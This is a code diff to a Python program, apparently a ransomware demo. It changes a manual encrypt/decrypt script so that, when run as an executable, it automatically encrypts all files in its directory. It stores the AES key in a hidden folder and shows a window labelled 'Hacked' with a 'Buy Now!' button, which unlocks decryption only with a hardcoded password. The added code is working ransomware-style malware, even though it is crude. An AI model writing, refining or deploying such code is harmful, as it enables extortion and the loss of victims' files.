@@ -5,6 +5,8 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 import ctypes  
+import tkinter as tk
+from tkinter import messagebox, simpledialog
 
 def create_hidden_folder(folder_path):
     """
@@ -52,14 +54,15 @@ def get_file_tree():
     Returns:
         tuple: A nested dictionary representing the file tree structure and the root directory path.
     """
-    exe_path = os.path.abspath(__file__)
+    #exe_path = os.path.abspath(__file__)
+    exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
     exe_dir = os.path.dirname(exe_path)
     exe_name = os.path.basename(exe_path)
     hidden_folder_name = ".hidden_folder"
     def build_tree(directory):
         tree = {}
         for entry in os.listdir(directory):
-            if entry == exe_name or entry == hidden_folder_name or entry.endswith(".dll") or entry.endswith(".pyd"):
+            if entry == exe_name or entry == hidden_folder_name or entry.endswith(".dll") or entry.endswith(".pyd") or entry == "base_library.zip" or entry == "Crypto":
                 continue
             entry_path = os.path.join(directory, entry)
             if os.path.isdir(entry_path):
@@ -136,53 +139,80 @@ def decrypt_and_restore(input_file, output_dir, key):
     # Start restoring files from the root
     restore_files(encrypted_data["structure"], output_dir, os.path.dirname(input_file))
 
-if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: python utils.py <encrypt|decrypt>")
-        sys.exit(1)
-    
-    mode = sys.argv[1].lower()
-    hidden_folder = os.path.join(os.path.dirname(__file__), ".hidden_folder")
 
-    if mode == "encrypt":
-        # Generate a random AES key
-        aes_key = get_random_bytes(16)
-        print(f"Generated AES key: {aes_key.hex()}")
-        
 
-        # Get the file tree and root directory
+
+
+
+# Get the directory where the executable or script is located
+BASE_DIR = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
+
+def encrypt_files():
+    hidden_folder = os.path.join(BASE_DIR, ".hidden_folder")
+    if not os.path.exists(hidden_folder):
+        # Encrypt mode
+        aes_key = os.urandom(16)
         file_tree, root_directory = get_file_tree()
-        
         create_hidden_folder(hidden_folder)
         save_key_to_dll(hidden_folder, aes_key)
-        
-        # Encrypt and store the files
         output_file = os.path.join(hidden_folder, "encrypted_data.json")
-        encrypt_and_store(file_tree, root_directory, output_file, aes_key)
-        
-        print(f"AES key has been saved in a hidden folder: {hidden_folder}")
-        
-        print(f"All files and folders have been encrypted and stored in {output_file}.")
-        print(f"Save this AES key to decrypt later: {aes_key.hex()}")
-    
-    elif mode == "decrypt":
+        encrypt_and_store(file_tree, BASE_DIR, output_file, aes_key)  # Use BASE_DIR instead of root_directory
+        messagebox.showinfo("Encryption Complete", "Files have been encrypted and stored.")
+    else:
+        messagebox.showwarning("Already Encrypted", "Files are already encrypted.")
+
+def decrypt_files():
+    hidden_folder = os.path.join(BASE_DIR, ".hidden_folder")
+    if os.path.exists(hidden_folder):
+        # Prompt user for password
+        password = simpledialog.askstring("Password Required", "Enter the decryption password:", show="*")
+        if not password:
+            messagebox.showwarning("Decryption Canceled", "No password entered. Decryption canceled.")
+            return
+
         # Load the AES key from the hidden folder
         aes_key = load_key_from_dll(hidden_folder)
-        print(f"AES key loaded from hidden folder: {aes_key.hex()}")
-        
-        # Load the encrypted data file from the hidden folder
         encrypted_file = os.path.join(hidden_folder, "encrypted_data.json")
         if not os.path.exists(encrypted_file):
-            print(f"Error: Encrypted data file not found in hidden folder: {encrypted_file}")
-            sys.exit(1)
-        
-        # Specify the restore directory
-        restore_directory = os.path.join(os.path.dirname(__file__), "restored")
-        
-        # Decrypt and restore the files
+            messagebox.showerror("Error", "Encrypted data file not found.")
+            return
+
+        # Verify password (for simplicity, assume the password is the hex representation of the AES key)
+        if password != "1234":
+            messagebox.showerror("Error", "Incorrect password. Decryption failed.")
+            return
+
+        # Decrypt files
+        restore_directory = os.path.join(BASE_DIR, "restored")
         decrypt_and_restore(encrypted_file, restore_directory, aes_key)
-        print(f"All files and folders have been restored to {restore_directory}.")
-    
+        messagebox.showinfo("Decryption Complete", f"Files have been restored to {restore_directory}.")
     else:
-        print("Invalid mode. Use 'encrypt' or 'decrypt'.")
-        sys.exit(1)
+        messagebox.showwarning("No Encrypted Data", "No encrypted data found to decrypt.")
+
+def auto_check():
+    hidden_folder = os.path.join(BASE_DIR, ".hidden_folder")
+    if not os.path.exists(hidden_folder):
+        # Automatically encrypt if no hidden folder exists
+        encrypt_files()
+        sys.exit(0)
+    
+
+def main():
+    auto_check()
+    root = tk.Tk()
+    root.title("File Encryptor/Decryptor")
+
+    tk.Label(root, text="Hacked", font=("Arial", 16)).pack(pady=10)
+
+
+    
+   
+
+
+    decrypt_button = tk.Button(root, text="Buy Now!", command=decrypt_files, width=20, height=2)
+    decrypt_button.pack(pady=10)
+
+    root.mainloop()
+
+if __name__ == "__main__":
+    main()
